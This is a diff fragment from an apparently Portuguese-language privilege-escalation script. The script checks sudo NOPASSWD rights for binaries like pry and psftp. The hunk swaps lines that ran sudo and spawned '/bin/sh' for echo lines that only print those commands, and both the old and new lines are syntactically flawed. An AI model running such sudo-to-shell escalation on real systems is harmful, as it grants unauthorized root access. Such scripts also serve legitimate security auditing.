@@ -2217,8 +2217,8 @@ EOF
             ;;
         pry)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
-            sudo "$paths"
-            system("/bin/sh")
+            echo "sudo "$paths""
+            echo "system("/bin/sh")"
             ;;
         psftp)
             echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
